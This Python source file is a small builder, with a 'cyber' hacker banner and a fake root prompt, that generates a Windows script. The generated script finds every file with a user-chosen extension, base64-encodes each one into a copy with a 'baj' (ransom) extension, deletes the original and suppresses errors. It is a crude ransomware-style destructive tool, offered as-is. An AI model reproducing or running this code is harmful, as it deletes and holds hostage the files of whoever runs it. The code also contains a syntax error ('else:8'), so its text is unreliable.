# -*- coding: utf-8 -*-
import os , time
from colorama import Fore as c
def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.001)
def windows_baj():
    if os.name == 'nt':
        
            os.system('cls')
    else:
            os.system('clear') 
    pr(c.YELLOW+'''
           
    ┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
    ├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
    └─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─
    \n''')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    name_file = input(f'\n{c.WHITE}root&@elf:~# {c.RED}Enter The Name Files: ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    name_baj = input(f'\n{c.WHITE}root&@elf:~# {c.RED}Enter The Name Baj: ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    baj = f'''
import base64 , os
import subprocess
try:
    c = subprocess.check_output('dir /S /B *.{name_file}' , shell=True).decode().split()

    for g in c:
              txt1 = open(g,'rb')
              data_1 = str(txt1.read())
              encodedBytes = base64.b64encode(data_1.encode("utf-8"))
              encodedStr = str(encodedBytes, "utf-8")
              txt = open(g+'.{name_baj}' , 'w+')
              txt.write(encodedStr)
              txt.close()
              txt1.close()
              os.remove(g)
except:
    pass
    '''
    try:
        os.chdir('output')
    except:
        pass
    file = open('baj_windows_.py' , 'w+')
    file.write(baj)
    pr(f"{c.WHITE}root&@elf:~# {c.GREEN}The file was created")
    time.sleep(5)
    if os.name == 'nt':
    
        os.system('cls')
    else:8
        os.system('clear') 
